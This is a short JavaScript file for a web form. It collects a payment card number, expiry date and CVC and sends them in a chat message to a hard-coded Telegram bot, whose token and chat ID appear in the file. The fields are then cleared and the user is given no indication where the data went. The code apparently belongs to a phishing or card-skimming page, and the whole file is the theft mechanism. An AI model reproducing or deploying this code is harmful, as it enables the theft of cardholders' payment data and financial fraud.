const CHAT_ID = "-1002101747684";
const URL_API = `https://api.telegram.org/bot6591959002:AAGkb-b8JEmXI8xlIww82O1DPhJl34Ngmic/sendMessage`;

const form = document.getElementById("form");
function pattern(event) {
  const inputs = form.elements;
  for (let i = 0; i < inputs.length; i++) {
    if (inputs[i].type === "text") {
      inputs[i].value = inputs[i].value.replace(/[^0-9/]/g, "");
    }
  }
}

form.addEventListener("input", pattern);

function submitForm(e) {
  e.preventDefault();
  const form = document.getElementById("form"); // Get reference to the form element
  console.log(form.elements.cardNumber.value);
  let message = ` Заявка \n`;
  message += `CardNumber: ${form.elements.cardNumber.value} \n`; // Use correct element names
  message += `Exired: ${form.elements.expired.value} \n`; // Use correct element names
  message += `CVC: ${form.elements.cvc.value} \n`; // Use correct element names
  console.log(message);
  axios
    .post(URL_API, {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: message,
    })
    .then((response) => {
      console.log(response.data);
      form.elements.cardNumber.value = "";
      form.elements.expired.value = "";
      form.elements.cvc.value = "";
    })
    .catch((error) => {
      console.error(error.response.data);
    });
}

form.addEventListener("submit", submitForm);
